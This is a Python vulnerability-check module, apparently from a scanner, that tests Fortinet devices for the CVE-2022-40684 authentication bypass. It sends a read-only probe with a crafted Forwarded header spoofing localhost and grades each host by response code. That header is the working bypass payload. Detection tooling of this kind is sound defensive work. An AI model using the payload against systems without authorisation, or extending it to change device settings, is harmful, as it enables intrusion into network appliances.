"""
CVE-2022-40684
FortiOS / FortiProxy / FortiSwitchManager HTTP management interface
authentication bypass via specially crafted Forwarded header.
Affected: FortiOS 7.0.0-7.0.6, 7.2.0-7.2.1; FortiProxy 7.0.0-7.0.6, 7.2.0;
          FortiSwitchManager 7.0.0, 7.2.0.
"""

import urllib3
import requests

from .base import BaseCheck, CheckResult

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class CVE_2022_40684(BaseCheck):
    CVE_ID = "CVE-2022-40684"
    DESCRIPTION = "HTTP Management Interface Authentication Bypass"
    AFFECTED_VERSIONS = (
        "FortiOS 7.0.0-7.0.6, 7.2.0-7.2.1; "
        "FortiProxy 7.0.0-7.0.6, 7.2.0; "
        "FortiSwitchManager 7.0.0, 7.2.0"
    )

    # Read-only endpoint — safe probe, no state mutation
    _PROBE = "/api/v2/cmdb/system/status"

    def check(self, host: str, port: int, **kwargs) -> CheckResult:
        target = f"{host}:{port}"
        url = f"https://{target}{self._PROBE}"
        headers = {
            "User-Agent": "Report Runner",
            "Forwarded": (
                'by="[127.0.0.1]:9999";'
                'for="[127.0.0.1]:9999";'
                'host="[127.0.0.1]:9999";'
                "proto=https"
            ),
            "Content-Type": "application/json",
            "Accept": "application/json",
        }
        try:
            r = requests.get(
                url, headers=headers, verify=False,
                timeout=10, allow_redirects=False,
            )
        except requests.exceptions.ConnectionError:
            return CheckResult(self.CVE_ID, target, "ERROR",
                               "Connection refused — management interface not reachable on this port")
        except requests.exceptions.Timeout:
            return CheckResult(self.CVE_ID, target, "ERROR", "Connection timed out")
        except Exception as e:
            return CheckResult(self.CVE_ID, target, "ERROR", str(e))

        if r.status_code == 200:
            version = "unknown"
            try:
                body = r.json()
                version = (
                    body.get("version")
                    or body.get("Version")
                    or body.get("results", {}).get("Version", "unknown")
                )
            except Exception:
                pass
            return CheckResult(
                self.CVE_ID, target, "VULNERABLE",
                f"Management API accessible without authentication (version: {version})",
                {"status_code": r.status_code, "version": version},
            )
        elif r.status_code in (401, 403):
            return CheckResult(self.CVE_ID, target, "PATCHED",
                               f"HTTP {r.status_code} — authentication enforced")
        elif r.status_code == 404:
            return CheckResult(self.CVE_ID, target, "UNKNOWN",
                               "Management API endpoint not found (non-FortiOS or different firmware)")
        else:
            return CheckResult(self.CVE_ID, target, "UNKNOWN",
                               f"Unexpected HTTP {r.status_code}")
